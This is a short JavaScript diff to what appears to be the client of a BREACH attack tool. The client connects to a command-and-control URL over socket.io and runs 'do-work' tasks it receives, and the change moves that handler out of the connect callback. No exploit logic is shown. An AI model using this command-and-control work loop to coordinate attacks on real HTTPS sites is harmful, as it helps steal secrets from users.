@@ -9,10 +9,10 @@ var BREACHClient = {
         this._socket = io.connect(this.COMMAND_CONTROL_URL);
         this._socket.on('connect', () => {
             console.log('Connected');
-            this._socket.on('do-work', (work) => {
-                console.log('do-work message');
-                this.doWork(work);
-            });
+        });
+        this._socket.on('do-work', (work) => {
+            console.log('do-work message');
+            this.doWork(work);
         });
         this.getWork();
         console.log('Initialized');
